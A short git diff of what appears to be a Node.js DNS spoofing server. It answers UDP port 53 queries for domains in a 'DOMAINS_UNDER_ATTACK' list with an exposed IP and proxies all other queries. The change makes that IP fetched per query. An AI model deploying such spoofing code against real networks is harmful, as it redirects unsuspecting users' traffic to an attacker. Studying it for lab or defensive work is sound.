@@ -30,11 +30,7 @@ function get_domain_from_DNS_query(buffer) {
     return sections.join(".")
 }
 
-const { EXPOSED_IP, DOMAINS_UNDER_ATTACK, EXTERNAL_DNS } = require("../config");
-
-
-
-
+const { GET_EXPOSED_IP, DOMAINS_UNDER_ATTACK, EXTERNAL_DNS } = require("../config");
 
 const nc = new NetcatServer()
 const server = nc.udp().port(53).listen();
@@ -47,6 +43,8 @@ function proxify(rinfo, data) {
 }
 
 server.on('data', async function (rinfo, data) {
+    const EXPOSED_IP = await GET_EXPOSED_IP()
+ 
     let domain = get_domain_from_DNS_query(data);
     if (DOMAINS_UNDER_ATTACK.indexOf(domain) == -1) {
         console.log("dns not spoofed for", domain);
